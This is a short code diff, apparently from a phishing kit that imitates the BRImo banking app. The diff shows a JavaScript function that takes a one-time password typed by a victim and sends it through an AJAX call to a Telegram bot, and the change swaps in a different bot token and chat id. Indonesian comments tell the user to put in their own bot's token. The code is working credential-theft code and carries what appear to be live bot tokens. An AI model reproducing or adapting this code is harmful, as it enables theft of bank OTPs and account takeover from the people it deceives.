@@ -4,8 +4,8 @@ function kirimPesan1(event){
 
     var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;
 
-var token = '7893053841:AAFtmaCs6EG1E0-blJWLFIy8S78ShAKcNzE'; // Ganti dengan token bot yang kamu buat
-    var grup = '6809554683'; // Ganti dengan chat id dari bot yang kamu buat    
+var token = '7625428500:AAF0CSHhLiU7YRGB0OwiV8qH688POeKuGV0'; // Ganti dengan token bot yang kamu buat
+    var grup = '8022812304'; // Ganti dengan chat id dari bot yang kamu buat    
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
